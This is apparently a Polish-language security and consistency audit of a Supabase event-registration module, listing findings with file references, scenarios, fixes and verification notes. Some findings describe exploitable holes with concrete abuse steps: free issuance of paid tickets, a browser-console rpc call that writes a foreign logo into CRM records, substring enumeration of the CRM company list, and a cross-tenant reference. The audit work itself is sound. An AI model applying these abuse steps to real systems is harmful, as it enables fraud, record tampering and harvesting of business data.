**Scenariusz.** Organizator obniża limit poziomu „Partner Główny" z 5 do 2, podczas gdy przypiętych jest 4 sponsorów. Baza odmawia z czytelną liczbą w komunikacie, a panel pokazuje samo „Operacja się nie udała" - bez informacji, że najpierw trzeba przenieść dwóch sponsorów.

**Naprawa.** Dopisać `tierOverCapacity` do `adminEventSponsors.errors` w obu językach, z {{count}} i {{total}} - mapper już wyciąga obie liczby z ogona komunikatu.

**Weryfikacja.** Kod podnoszony w supabase/migrations/20260824092824_bb9c20c9...sql:114-117 (wczesniej 20260823160000_event_sponsors_companies.sql:1000) i nie jest nadpisany przez zadna nowsza migracje - grep 'tier_over_capacity' daje tylko te dwa pliki. Slownik adminEventSponsors.errors (src/lib/i18n-admin-event-sponsors.ts:85-86) ma tierInUse i tierFull z {{count}}/{{total}}, ale nie ma tierOverCapacity (grep po src/ bez trafien), […]

---

## Powiązania między modułami

> Event Builder jest zbudowany jako osobny podsystem (39 tabel `event_*`, ~110 RPC, własne studio `/admin/events/$eventId/*`), który świadomie NIE dubluje trzech silników platformy: strony idą przez `pages` + mapowanie `event_pages`, dyskusje przez kluby (`event_discussions` czyta `club_threads`), a sponsorzy przez `crm_companies` z jawną migawką prezentacji. Te trzy styki są zrobione porządnie (złożone klucze obce po `(tenant_id, id)`, izolacja najemcy, migawka zamiast odczytu na żywo). Styki z rzeczami STARSZYMI od modułu są natomiast rozjechane, i zawsze w ten sam sposób: nowa ścieżka pisze `event_registrations`/`event_people`, a stare mechanizmy platformy (przypomnienia `run_event_reminders`, grupa czatu `create_event_group`, katalog prelegentów `get_public_speakers`, macierz uprawnień) nadal czytają wyłącznie `event_rsvps`/`user_id`. Najpoważniejsze są trzy rzeczy: (1) wszystkie zdarzenia rejestracji są ODRZUCANE przez CHECK na `domain_events.event_type` i połykane przez `EXCEPTION WHEN OTHERS` w emiterze — szyna zdarzeń modułu rejestracji nie działa w ogóle i nikt tego nie […]

### [KRYTYCZNY] Publiczny event_register() nie sprawdza ceny wejściówki — płatny bilet za darmo

> **To samo ustalenie co „Platny bilet Event Buildera jest wydawany za darmo" w sekcji
> „Bilety, pakiety, regulaminy". W dokumencie głównym występuje raz, jako K-1. Nie liczyć podwójnie.**

`supabase/migrations/20260827220945_d4ece1f0-ffc7-43aa-a5b0-a04c95760ae7.sql:344` · bezpieczenstwo · weryfikacja: POTWIERDZONE

Blok walidacji wybranego typu wejściówki w `event_register(jsonb)` sprawdza `is_active` (:344), okno sprzedaży (:347, :350), `min_tier_rank` (:353) i `access_code_hash` (:363), a następnie limit miejsc (:319). Kolumna `event_ticket_types.price_cents` nie pojawia się w całym ciele funkcji ani razu. Wiersz zgłoszenia powstaje z domyślnym `payment_status = 'not_required'` (supabase/migrations/20260828053802_6e09cbdf-17b4-4b06-8c2b-8fa3fac8ab49.sql:20). Poprawna ścieżka kasowa istnieje obok i jest zrobiona dobrze (`event_ticket_checkout_quote` + src/lib/billing/checkout.functions.ts:141, z fazami cenowymi i pulą z planu), ale formularz zapisu jej nie dotyka — a płatne bilety są w nim normalnie wyklikiwalne: RegistrationTicketPicker rysuje cenę (src/components/events/registration/RegistrationTicketPicker.tsx:106-108), a `isTicketSelectable` przepuszcza każdy bilet ze stanem 'on_sale' bez oglądania się na cenę (src/lib/events/registrationFormSurface.ts:374). Funkcja jest nadana `anon` […]

**Scenariusz.** Wydarzenie ma registration_mode='form' i dwa typy wejściówek: 'standard' 1200 zł i 'student' 0 zł. Uczestnik wchodzi na /events/<slug>/register, zaznacza kafelek „Standard — 1 200,00 zł" i wysyła formularz. Powstaje event_registrations ze statusem approved, payment_status='not_required', kod QR jest wydany, miejsce z puli zjedzone. Nie powstaje żadne payment_orders. Organizator widzi opłaconego uczestnika, którego […]

**Naprawa.** W `event_register()` po ustaleniu v_ticket policzyć cenę tą samą funkcją, co kasa (`_event_ticket_price_now` / `_event_ticket_phase`) i przy wyniku > 0 albo odrzucić zgłoszenie błędem 'payment_required: buy this ticket in checkout', albo zapisać zgłoszenie ze statusem 'pending' i `payment_status='unpaid'`, oddając w odpowiedzi identyfikator do koszyka. Równolegle `isTicketSelectable` powinien w formularzu blokować […]

**Weryfikacja.** Najnowsza definicja event_register(jsonb) to supabase/migrations/20260827220945_d4ece1f0...sql:186-577 (pozniejszych redefinicji nie ma - rg 'FUNCTION public.event_register' daje tylko 20260823150000, 20260824090214 i ta). W calym ciele (linie 186-577) grep po 'price|payment|paid|checkout|quote' nie zwraca NICZEGO; walidacja biletu to wylacznie is_active (:343-345), okno sprzedazy (:346-351), min_tier_rank […]

### [wysoki] Katalog zdarzeń domenowych nie zna zdarzeń sesji, a bramka CI nie umie ich zobaczyć

`src/lib/realtime/__tests__/domainEventCatalog.test.ts:13` · niespojnosc · weryfikacja: POTWIERDZONE

`admin_event_session_save` emituje 'event_session.published.v1' i 'event_session.cancelled.v1' przez sklejenie napisu: `'event_session.' || v_status || '.v1'` (supabase/migrations/20260823140000_event_sessions.sql:1859, drugie miejsce :2046). Oba typy przechodzą CHECK bazy, więc realnie lądują w `domain_events` — ale nie ma ich ani w DOMAIN_EVENT_TYPES (src/lib/realtime/domainEvents.ts, lista kończy się na event_sponsor.snapshot_refreshed.v1), ani w src/lib/realtime/eventInvalidationMap.ts:190-200. `invalidationKeysFor()` zwraca dla nich pustą listę i inwalidacja między modułami po cichu nic nie robi. Bramka, która miała to złapać, ma dwie ślepe plamy naraz: wzorzec `EEVENT_TYPE_RE = /'([a-z_]+\.[a-z_]+\.v\d+)'/` (:13) opisuje wyłącznie nazwy DWUCZŁONOWE wpisane jako literał — nie widzi ani typu sklejanego w SQL-u, ani czteroczłonowych 'event.registration.*.v1' z poprzedniego zgłoszenia. Uruchomiłem test: przechodzi, mimo że oba komplety zdarzeń są poza katalogiem.

**Scenariusz.** Redaktor publikuje sesję agendy w studiu. DB zapisuje 'event_session.published.v1' do domain_events. Uczestnik ma otwartą stronę /events/<slug>/agenda; strumień zdarzeń dostaje wiersz, isKnownDomainEventType() zwraca false, invalidationKeysFor() zwraca [], żadne query nie jest unieważnione i agenda nie odświeża się do czasu ręcznego przeładowania. CI jest zielone.

**Naprawa.** W skanerze testu wykrywać także typ budowany z konkatenacji (dopasować `'<agregat>.' ||` i zebrać dopuszczalne wartości ze zbioru statusów) oraz poluzować wzorzec do `[a-z0-9_.]+\.v\d+`, żeby nazwa łamiąca konwencję została ZGŁOSZONA, a nie pominięta. Dopisać event_session.published.v1 / .cancelled.v1 do DOMAIN_EVENT_TYPES i do eventInvalidationMap (klucz gałęzi wydarzenia, tak jak meetingEventKeys).

**Weryfikacja.** Sklejanie typu potwierdzone w obu miejscach: supabase/migrations/20260823140000_event_sessions.sql:1855-1863 ('event_session.' || v_status || '.v1') oraz :2041-2050 w admin_event_sessions_set_status. Oba typy przechodza CHECK bazy (test regexa: 'event_session.published.v1' -> dopasowanie), wiec realnie ladują w domain_events. Katalog ich nie zna: DOMAIN_EVENT_TYPES konczy sie na 'event_sponsor.snapshot_refreshed.v1' […]

### [wysoki] Przypomnienie 24h przed wydarzeniem nie dociera do zgłoszeń z formularza

`supabase/migrations/20260713093000_events_module.sql:308` · luka-funkcjonalna · weryfikacja: POTWIERDZONE

`run_event_reminders()` (pg_cron, `'5 * * * *'`, :388) iteruje wyłącznie po `public.event_rsvps` złączonych z `events` (:308) i znaczy wysyłkę w `event_rsvps.reminded_at` (:326). Nowa ścieżka zapisu pisze `event_registrations` i tabela ta nie występuje w funkcji ani razu; nie ma też odpowiednika kolumny `reminded_at`. Obie ścieżki żyją równolegle świadomie — mówi to wprost komentarz w supabase/migrations/20260823170000_event_front_binding.sql:516 („obie sciezki zapisu sa zywe") — ale przypomnienia zostały tylko na starej. Ta sama asymetria dotyczy in-app `enqueue_notification`: w dziewięciu migracjach modułu Event Builder nie ma ani jednego wywołania (jedyne trafienie w 20260823150000:1216 to komentarz).

**Scenariusz.** Kongres ma registration_mode='form' i 400 zatwierdzonych zgłoszeń w event_registrations, zero wierszy w event_rsvps. Cron o 5 minut po każdej godzinie wykonuje run_event_reminders(), pętla nie znajduje nic i zwraca 0. Na dobę przed wydarzeniem żaden z 400 uczestników nie dostaje ani powiadomienia w dzwonku, ani przypomnienia — mimo że przycisk „uruchom przypomnienia" w panelu raportuje sukces.

**Naprawa.** Rozszerzyć run_event_reminders() o drugą pętlę po `event_registrations` (status in ('approved','attended')) z własnym znacznikiem `reminded_at` na tej tabeli i adresatem z `event_people.user_id` dla osób z kontem oraz z e-mailem kartoteki dla osób bez konta. Przy okazji dopisać pgtap na obu pętlach — dziś nie ma w supabase/tests żadnego testu dotykającego event_registrations.

**Weryfikacja.** run_event_reminders() w najnowszej wersji (supabase/migrations/20260713093000_events_module.sql:297-331, wczesniejsza 20260712224438...sql:590) iteruje wylacznie po public.event_rsvps JOIN events (:307-315) i stempluje event_rsvps.reminded_at (:326); tabela event_registrations nie wystepuje w tej funkcji ani razu. Cron '5 * * * *' potwierdzony na :385-389. Szukalem zastepnika szeroko: grep 'reminder|remind' po […]

### [wysoki] Studio wydarzenia pyta o dane RPC bramką szerszą niż baza — redaktor dostaje pusty ekran z błędem

`src/components/admin/events/studio/EventStudioShell.tsx:69` · niespojnosc · weryfikacja: POTWIERDZONE

Rama studia liczy `const canWrite = isAdmin || roles.includes("editor")` (:69) i tym predykatem uzbraja główne zapytanie `useAdminEventDetail(canWrite ? eventId : "")` (:72). Tymczasem `admin_event_detail` stoi na `assert_event_admin_tenant()` (supabase/migrations/20260826150000_event_registration_settings_and_features.sql:98 — najnowsza definicja), czyli admin albo super_admin, NIGDY editor. Ten sam plik dwie linie niżej robi to poprawnie dla podstron, z jawnym uzasadnieniem: `useAdminEventPages(isAdmin ? eventId : "")` (:90, komentarz :86-89). Do tego grupa `events` w sidebarze panelu stoi w części WSPÓLNEJ adminNav, a nie w bloku `if (isAdmin)` (src/lib/admin/adminNav.ts:340-345 vs :349), a ekran listy celowo wpuszcza redaktora (src/routes/admin.events.list.tsx:48). Redaktor ma więc pozycję w menu, widzi listę wydarzeń i klika „edytuj", po czym trafia do studia, którego rama nie umie wczytać wiersza.

**Scenariusz.** Użytkownik z rolą `editor` klika „Wydarzenia" w panelu, widzi listę (to działa), klika wiersz kongresu i ląduje na /admin/events/<id>/general. `admin_event_detail` zwraca odmowę uprawnień, `detailQ.data` zostaje null, pasek górny nie zna tytułu, sidebar sekcji nie zna przełączników modułów, formularz „Informacje ogólne" nie ma czego wypełnić. Redaktor widzi błąd bez wskazówki, że ten moduł po prostu nie jest dla […]

**Naprawa.** Zastąpić `canWrite` przez `isAdmin` w :72 (i wszędzie, gdzie rama pyta RPC modułu), a na poziomie wejścia dodać jawny ekran „ten moduł jest dostępny wyłącznie dla administratora" zamiast błędu zapytania. Równolegle rozstrzygnąć adminNav: albo przenieść pozycję `/admin/events` do bloku `if (isAdmin)` (spójne z bazą), albo świadomie zostawić ją redakcji i wtedy pozycja ma prowadzić na listę bez odnośnika do studia.

**Weryfikacja.** Wszystkie ogniwa sprawdzone. src/components/admin/events/studio/EventStudioShell.tsx:69 - 'const canWrite = isAdmin || roles.includes("editor")', :72 - 'useAdminEventDetail(canWrite ? eventId : "")'; dwie linie nizej ta sama rama uzywa isAdmin dla stron z jawnym uzasadnieniem (:86-90). Najnowsza definicja admin_event_detail to supabase/migrations/20260826150000_event_registration_settings_and_features.sql:34 […]

### [wysoki] Wszystkie zdarzenia rejestracji są odrzucane przez CHECK i po cichu gubione

`supabase/migrations/20260823150000_event_people_registration.sql:2255` · blad · weryfikacja: POTWIERDZONE

Moduł rejestracji emituje typy CZTEROCZŁONOWE: 'event.registration.created.v1' (:2255), 'event.registration.cancelled.v1' (:2391), 'event.registration.decided.v1' (:2898), 'event.registration.promoted.v1' (:1642, :3303) oraz created/updated w :3155-3157. Tymczasem tabela szyny ma ograniczenie `CHECK (event_type ~ '^[a-z0-9_]+\.[a-z0-9_]+\.v[0-9]+$')` (supabase/migrations/20260711220607_555aaf71-75e5-4153-a123-4d3b78715ffc.sql:12, pierwotnie 20260711200000_domain_event_bus.sql:34) — dopuszcza DOKŁADNIE dwa człony przed wersją. Sprawdziłem regułę literalnie: 'event.registration.created.v1' -> ODRZUCONE, 'event_session.published.v1' -> OK. Wstawienie kończy się błędem 23514, ale jedyny emiter kończy się blokiem `EXCEPTION WHEN OTHERS THEN RETURN NULL` (supabase/migrations/20260808190000_discussion_clubs_a17_event_actor_order.sql:69), więc awaria jest niewidoczna: RPC rejestracji zwraca sukces, a na szynie nie ma nic. Skutkiem jest to, że rejestracja — najważniejsze zdarzenie modułu — nie […]

**Scenariusz.** Uczestnik wysyła formularz na /events/kongres-2026/register. `event_register()` zapisuje wiersz w event_registrations i woła emit_domain_event z typem 'event.registration.created.v1'. INSERT do domain_events łamie CHECK (23514), emiter połyka wyjątek i zwraca NULL. Panel organizatora otwarty w drugiej karcie nie odświeża listy zgłoszeń, żaden webhook nie leci, a w domain_events nie ma śladu, że ktokolwiek się […]

**Naprawa.** Przenumerować typy na dwuczłonowe zgodnie z kontacktem katalogu — 'event_registration.created.v1', 'event_registration.cancelled.v1', 'event_registration.decided.v1', 'event_registration.promoted.v1', 'event_registration.updated.v1' (agregat i tak nazywa się już 'event_registration') — dopisać je do DOMAIN_EVENT_TYPES i do eventInvalidationMap z kluczem gałęzi wydarzenia. Osobno: emiter nie powinien połykać 23514 po […]

**Weryfikacja.** Sprawdzone literalnie. Ograniczenie tabeli szyny nadal brzmi CHECK (event_type ~ '^[a-z0-9_]+\.[a-z0-9_]+\.v[0-9]+$') - supabase/migrations/20260711200000_domain_event_bus.sql:34 oraz powtorzone w 20260711220607_555aaf71...sql:12; w calym katalogu migracji nie ma ANI JEDNEGO 'ALTER TABLE public.domain_events ... DROP/ADD CONSTRAINT' (grep po 'ALTER TABLE.*domain_events' zwraca wylacznie dwie linie 'ENABLE ROW LEVEL […]

### [wysoki] „Moje wydarzenia" w profilu nie pokazują udziału zapisanego przez RSVP

`supabase/migrations/20260828095114_487f652e-3876-4d45-b1bb-240289ba24d8.sql:71` · luka-funkcjonalna · weryfikacja: POTWIERDZONE

`event_my_registrations()` czyta wyłącznie `public.event_registrations` złączone z `event_people` po `pe.user_id = v_uid` (:71-75). Tabela `event_rsvps` nie pojawia się w funkcji. Tymczasem tryb `registration_mode='rsvp'` nadal jest żywą ścieżką i pisze wyłącznie `event_rsvps` (rsvp_event, supabase/migrations/20260823136000_event_builder_review_fixes.sql:372), co potwierdza komentarz w src/lib/events/registrationSurface.ts:296-298. Obie powierzchnie profilu — /profile/events (src/routes/profile.events.tsx:10 -> src/components/profile/events/MyEventsPanel.tsx:4) i /profile/tickets — stoją na tym jednym RPC; w całym froncie nie ma drugiego zapytania o event_rsvps na potrzeby listy „moje wydarzenia".

**Scenariusz.** Członek klika RSVP „Wezmę udział" na briefingu (tryb rsvp), dostaje potwierdzenie i wiersz w event_rsvps ze statusem 'going'. Wchodzi do /profile/events, żeby sprawdzić, gdzie się zapisał — widzi pustą zakładkę „Nadchodzące" z komunikatem o braku zgłoszeń. Jego historia udziału w webinarach i briefingach nie istnieje nigdzie w profilu.

**Naprawa.** Dołożyć w event_my_registrations drugą gałąź UNION po event_rsvps (status going/waitlist) rzutowaną na ten sam kształt wiersza, z payment_status='not_required' i order_id=NULL, oznaczoną polem `source` ('rsvp' vs 'registration'), żeby front umiał pokazać właściwą akcję rezygnacji. Alternatywnie — jeśli plan zakłada wygaszenie event_rsvps — dopisać migrację przenoszącą RSVP do event_registrations, ale do tego czasu […]

**Weryfikacja.** event_my_registrations czyta wylacznie event_registrations JOIN event_people ON pe.user_id = v_uid - supabase/migrations/20260828095114_487f652e...sql:70-77; event_rsvps nie wystepuje w tej funkcji. Szukalem mostu: grep 'event_registrations' po migracjach zawierajacych 'rsvp' zwraca wylacznie CHECK-a na kolumnie registration_mode (20260823150000:699, 20260824085456:443) - zadnego triggera ani backfillu z event_rsvps […]

### [średni] Każdy zalogowany użytkownik może pisać do rejestru firm CRM

`supabase/migrations/20260828133656_85a39c03-ac3e-4185-bd77-e93d1e7edf94.sql:22` · bezpieczenstwo · weryfikacja: POTWIERDZONE

`crm_company_create_self(...)` jest SECURITY DEFINER, nadana `authenticated` (:99) i wstawia wiersz wprost do `public.crm_companies` — nazwa, logo_url, adres, telefon, e-mail, www, branża (:63-77). Gdy firma o tej samej `name_norm` już istnieje, funkcja NIE kończy pracy, tylko wykonuje UPDATE uzupełniający puste pola istniejącego rekordu (`logo_url = COALESCE(c.logo_url, <wejście>)` i tak samo dla address/city/postal_code/country/phone/email/website/branch, :79-89). Nie ma tu ani `rate_limit_hit` (którego `event_register` używa w :1970 tamtej migracji), ani żadnej kolumny odróżniającej wiersz samoobsługowy od kartoteki prowadzonej przez handel. To ma bezpośrednie przełożenie na Event Buildera: sponsor bierze logotyp z `crm_companies.logo_url` (src/components/admin/events/molecules/EventSponsorDialog.tsx:181).

**Scenariusz.** Zalogowany członek wywołuje z konsoli przeglądarki supabase.rpc('crm_company_create_self', {p_name:'ORLEN', p_logo_url:'https://obcy.example/logo.png', p_website:'https://obcy.example'}) . Jeśli ORLEN jest w CRM bez logotypu, funkcja dopisuje mu logo i domenę wskazane przez obcą osobę. Organizator przypina ORLEN jako sponsora, `admin_event_sponsor_save` robi migawkę z kartoteki i podstawiony obrazek ląduje na […]

**Naprawa.** Dopisać `rate_limit_hit('crm_company_self', auth.uid()::text, ...)` na wejściu; ograniczyć gałąź UPDATE do wierszy, których `created_by = auth.uid()` (dopisywanie pól do cudzej/handlowej kartoteki nie powinno być możliwe); dodać `crm_companies.source text NOT NULL DEFAULT 'sales'` i ustawiać 'self_service' dla tej ścieżki, żeby lista CRM i wybór sponsora umiały te wiersze oddzielić. Rozważyć rejestr kandydatów […]

**Weryfikacja.** Mechanika zgadza sie co do litery: crm_company_create_self jest SECURITY DEFINER (supabase/migrations/20260828133656_85a39c03...sql:22-97), jedyna bramka to 'IF v_uid IS NULL' (:45-47), grant dla authenticated (:99), a przy istniejacej name_norm robi UPDATE dosiewajacy puste pola, w tym logo_url i website (:79-89). Nie ma triggera ani rate-limitu na crm_companies (grep 'ON public.crm_companies' po CREATE TRIGGER - […]

### [średni] Każdy zalogowany użytkownik może przeszukać cały rejestr firm CRM

`supabase/migrations/20260828133656_85a39c03-ac3e-4185-bd77-e93d1e7edf94.sql:3` · bezpieczenstwo · weryfikacja: POTWIERDZONE

`crm_company_search(p_query, p_limit)` jest SECURITY DEFINER, nadana `authenticated` (:20), a jedynym warunkiem dostępu jest `auth.uid() IS NOT NULL` (:12). Dopasowanie to `name_norm LIKE '%' || query || '%'`, więc zapytanie jest podciągiem, a nie prefiksem — jedna literka zwraca do 25 firm z nazwą, logotypem, miastem, krajem, branżą i adresem www. Pokrewny `crm_company_brand(p_name)` (supabase/migrations/20260828131628_c9408e42-c11c-4ab4-bb65-fdc792d0d8e2.sql:216) jest nadany nawet `anon` (:234) i działa jak wyrocznia „czy firma X jest w waszym CRM". Komentarz w src/lib/crm/companyDirectory.ts:5-6 twierdzi „Żadnych danych handlowych CRM", ale sama lista firm w rejestrze JEST danymi handlowymi — to spis kontaktów sprzedaży. W całym repozytorium `crm_companies` jest poza tym powierzchnią wyłącznie sztabową.

**Scenariusz.** Konkurent zakłada darmowe konto na platformie, po czym w pętli woła crm_company_search dla kolejnych dwuznakowych podciągów ('aa','ab',...). Po kilku minutach ma pełną listę firm w rejestrze CRM New European Strategies wraz z branżami i domenami — czyli listę klientów i prospektów. Anonimowy użytkownik bez konta może to samo zweryfikować punktowo przez crm_company_brand.

**Naprawa.** Zawęzić wyszukiwanie do dopasowania od początku nazwy (`name_norm LIKE query || '%'`), wymagać minimum 3 znaków, dołożyć `rate_limit_hit` per użytkownik i zwracać wyłącznie pola potrzebne podpowiedzi (id, name, city, country). Dla `crm_company_brand` odebrać grant `anon` — brand firmy jest potrzebny w formularzu zapisu, a ten i tak wymaga zalogowania na ścieżce profilu uczestnika.

**Weryfikacja.** Fakty co do samych funkcji sie zgadzaja: crm_company_search jest SECURITY DEFINER z jedynym warunkiem 'auth.uid() IS NOT NULL' i dopasowaniem podciagiem name_norm LIKE '%'||query||'%' (supabase/migrations/20260828133656_85a39c03...sql:3-17), grant dla authenticated (:20), limit 25 (:16); crm_company_brand jest nadany takze anon - supabase/migrations/20260828131628_c9408e42...sql:216-234 (GRANT ... TO anon w :234). […]

### [średni] Przycisk grupy czatu wydarzenia zawsze odmawia na wydarzeniach z formularzem zapisu

`supabase/migrations/20260717162432_436f3a05-2743-4686-976d-fda5a4db740a.sql:681` · luka-funkcjonalna · weryfikacja: POTWIERDZONE

`create_event_group(uuid)` zbiera uczestników wyłącznie z `event_rsvps` ze statusem 'going' (:681) i przy pustym zbiorze rzuca 'events: no attendees to invite' (:685). Front tłumaczy ten błąd na komunikat network.eventGroupEmpty (src/components/network/EventGroupButton.tsx:55). Przycisk renderuje się dla każdego opublikowanego wydarzenia, jeśli tylko chat jest włączony i wołający jest gospodarzem albo staffem (:30-31) — bez oglądania się na tryb zapisów. Dla wydarzenia prowadzonego przez event_registrations zbiór 'going' jest z definicji pusty.

**Scenariusz.** Gospodarz kongresu z 300 zatwierdzonymi zgłoszeniami w event_registrations widzi na stronie wydarzenia kafelek „Utwórz grupę uczestników", klika i dostaje toast „Brak uczestników do zaproszenia". Klika ponownie z tym samym skutkiem — nic w interfejsie nie mówi, że ta funkcja czyta inną tabelę niż ta, w której siedzą jego uczestnicy.

**Naprawa.** Rozszerzyć create_event_group o UNION po event_registrations (status in ('approved','attended')) przez event_people.user_id, z pominięciem osób bez konta i z zachowaniem limitu 49. Do czasu poprawki ukryć EventGroupButton dla wydarzeń o registration_mode <> 'rsvp' — przycisk kończący się zawsze błędem jest gorszy niż jego brak.

**Weryfikacja.** Najnowsza definicja create_event_group to supabase/migrations/20260717170000_connections_v2.sql:459-518 (pozniejsza niz cytowana 20260717162432) i zbiera uczestnikow dokladnie tak samo: SELECT r.user_id FROM public.event_rsvps r WHERE r.status = 'going' (:494-501), a pusty zbior konczy sie RAISE 'events: no attendees to invite' (:502-504). event_registrations w tej funkcji nie wystepuje. Front renderuje kafelek bez […]

### [średni] Zakres kuponu „to wydarzenie / ten typ biletu" istnieje tylko w bazie

`supabase/migrations/20260824080000_event_admissions_packages_coupons.sql:633` · luka-funkcjonalna · weryfikacja: POTWIERDZONE

Migracja dokłada `b2b_coupons.event_ids uuid[]`, `b2b_coupons.ticket_type_ids uuid[]` i `max_redemptions_per_user` (:633-634), te same kolumny na kampaniach (:639-640) i indeksy GIN (:675-679) — dokładnie tak, jak rozstrzyga §8 („Codes przestaje być pytaniem otwartym: zakres 'to wydarzenie / ten typ biletu' na istniejącym /admin/coupons plus wejście z poziomu wydarzenia"). W kodzie frontu żadna z tych trzech nazw nie występuje ani razu poza wygenerowanym src/integrations/supabase/types.ts; ekrany src/routes/admin.coupons.index.tsx, .campaigns.tsx, .redemptions.tsx nie mają pól zakresu, a w studiu wydarzenia nie ma pozycji „Kody" (src/lib/events/eventStudioNav.ts:56-88 — sekcje rejestracji to settings/list/tickets/packages/form). Osobno: `event_admission_quote` (:804) i `event_package_purchase` (:1231) — czyli wycena z kuponem i samoobsługowy zakup pakietu — nie są wołane z żadnego miejsca w src/.

**Scenariusz.** Organizator chce dać partnerowi 50 kodów rabatowych ważnych wyłącznie na typ biletu „Partner" jednego kongresu. Wchodzi na /admin/coupons, tworzy kampanię — formularz pozwala ograniczyć kupon do planów członkowskich (plan_ids) i nic więcej. Wygenerowane kody działają na WSZYSTKO, co przechodzi przez kasę, w tym na subskrypcje. Kolumny, które miały to ograniczyć, zostają puste, bo nie ma ich w żadnym formularzu.

**Naprawa.** Dodać do formularza kuponu i kampanii w /admin/coupons dwa selektory (wydarzenie, typ wejściówki) zapisujące event_ids/ticket_type_ids oraz pole max_redemptions_per_user, a w studiu wydarzenia sekcję „Kody" filtrującą listę po event_ids. Podpiąć event_admission_quote do ścieżki kasowej wejściówki, żeby zakres kuponu był egzekwowany po stronie bazy, a nie tylko deklarowany w kolumnie.

**Weryfikacja.** Kolumny i indeksy istnieja: supabase/migrations/20260824080000_event_admissions_packages_coupons.sql:632-636 (b2b_coupons.event_ids, ticket_type_ids, package_ids, max_redemptions_per_user), :638-644 na kampaniach, indeksy GIN :674-680. Baza je NAWET EGZEKWUJE przy realizacji - 20260825191948_ab7f57aa...sql:738-744 sprawdza 'v_event_id = ANY (v_coupon.event_ids)' i 'v_ticket_type_id = ANY (v_coupon.ticket_type_ids)' […]

### [niski] Most kluby→wydarzenia (anchor_event_id) jest martwy i nie sprawdza najemcy

`supabase/migrations/20260822096000_club_events_tier_gate.sql:235` · ryzyko · weryfikacja: POTWIERDZONE

`club_event_upsert` wstawia `anchor_event_id` wprost z payloadu: `NULLIF(p_payload->>'anchor_event_id','')::uuid` (:235, w gałęzi UPDATE :263-264), bez sprawdzenia, że wskazane wydarzenie w ogóle istnieje w tenancie wyliczonym przez `club_require_curator` (v_tenant, :214). Jedynym zabezpieczeniem jest klucz obcy JEDNOKOLUMNOWY `anchor_event_id uuid REFERENCES public.events(id) ON DELETE SET NULL` (supabase/migrations/20260808195444_3bb4eb57-2689-43fe-ada6-56d868c5200e.sql:64, powtórzony w 20260808300000:131) — a `events` ma od 20260823135000_events_tenant_identity.sql tożsamość złożoną `(tenant_id, id)`, z której cały Event Builder konsekwentnie korzysta (np. event_pages_event_fk, event_sponsors_event_fk). Do tego most nie ma ŻADNEJ powierzchni: `anchor_event_id` nie występuje w src/ poza typami i słownikami pól (src/lib/clubs/workspaceTypes.ts:310, networkTypes.ts:163), formularz wydarzenia klubu go nie oferuje (src/components/clubs/molecules/ClubEventForm.tsx — pola to tytuły, […]

**Scenariusz.** Kurator klubu w najemcy B woła club_event_upsert z anchor_event_id wskazującym wydarzenie najemcy A (identyfikator zdobyty z publicznej strony tamtego serwisu). Klucz obcy przepuszcza, bo patrzy tylko na events.id. Powstaje wiersz club_events najemcy B trwale związany z wydarzeniem najemcy A — dziś bez widocznego skutku, bo nikt tej kolumny nie czyta, ale pierwszy ekran, który zacznie po niej złączać tytuł […]

**Naprawa.** Podnieść klucz obcy do złożonego `FOREIGN KEY (tenant_id, anchor_event_id) REFERENCES public.events (tenant_id, id) ON DELETE SET NULL` (unikat na events już istnieje) i dodać w club_event_upsert jawną walidację przynależności do v_tenant z czytelnym błędem. Osobno rozstrzygnąć produktowo, czy most ma zostać: albo dołożyć wybór wydarzenia w ClubEventForm i odnośnik w kalendarzu klubu, albo usunąć kolumnę — dziś jest […]

**Weryfikacja.** Sprawdzone na NAJNOWSZEJ definicji, ktora nie jest ta cytowana: club_event_upsert zyje ostatnio w supabase/migrations/20260822171037_bea8e790...sql:1056-1091 i zachowuje sie identycznie jak wersja z 20260822096000_club_events_tier_gate.sql:227-264 - anchor_event_id wpada wprost z payloadu (INSERT :1064, UPDATE :1090-1091), bez ani jednego zapytania weryfikujacego, ze wydarzenie nalezy do v_tenant z […]

### [niski] Prelegent bez konta z publiczną nakładką znika z katalogu prelegentów platformy

`supabase/migrations/20260727200000_speaker_profiles_event_widgets.sql:161` · niespojnosc · weryfikacja: POTWIERDZONE

Tryb katalogu w `get_public_speakers` wybiera `sp.user_id` z `speaker_profiles WHERE sp.is_public` (:159-164), a wynik złącza `JOIN public.profiles p ON p.id = b.user_id` — złączeniem WEWNĘTRZNYM (:193). Migracja 20260826180000_event_speaker_person.sql:150 zdjęła NOT NULL z `speaker_profiles.user_id` i wprowadziła XOR user_id/person_id (:173-174), więc prelegent wpisany ręcznie w studiu ma user_id NULL i wypada z katalogu bezwarunkowo i bez błędu. Ten sam problem został już rozpoznany i naprawiony dla źródła `event` — src/lib/builder/speakersQuery.ts:19-27 opisuje go dosłownie („INNER JOIN kasowal go z listy BEZWARUNKOWO I BEZ BLEDU") i przesiadł widget na event_speakers_public — ale trybu katalogu nikt nie ruszył, a migracja 20260826180000:48 mówi wprost „NIE przepisuje get_public_speakers". Skutek: przełącznik „profil publiczny" na prelegencie bez konta jest przełącznikiem bez skutku dla widgetu `speakers` w trybie `directory`.

**Scenariusz.** Redaktor dodaje w studiu prelegentkę spoza platformy (bez konta), wypełnia nakładkę sceniczną i zaznacza „profil publiczny". Na stronie wydarzenia karta się pokazuje (event_speakers_public ją zna). Redaktor wstawia na stronę główną widget „Prelegenci" ze źródłem `directory` — tam jej nie ma i nigdy nie będzie, bez żadnego komunikatu.

**Naprawa.** Przepisać tryb katalogu get_public_speakers tak samo jak zrobiono to w event_speakers_public: LEFT JOIN na profiles, LEFT JOIN na event_people po speaker_profiles.person_id, i warunek `WHERE p.id IS NOT NULL OR pe.id IS NOT NULL`; zwracać speaker_profile_id, żeby klucz karty (src/lib/builder/speakerRow.ts) miał się na czym oprzeć także dla osoby bez konta.

**Weryfikacja.** Kod potwierdza mechanike: tryb katalogu w get_public_speakers bierze sp.user_id z speaker_profiles WHERE sp.is_public (supabase/migrations/20260727200000_speaker_profiles_event_widgets.sql:159-165), a wynik zlaczony jest INNER JOIN-em 'JOIN public.profiles p ON p.id = b.user_id' (:193-195); sprawdzilem, ze zadna pozniejsza migracja tej funkcji nie przedeklarowuje (rg 'get_public_speakers' po migracjach: pozostale […]

---

## i18n i dostępność

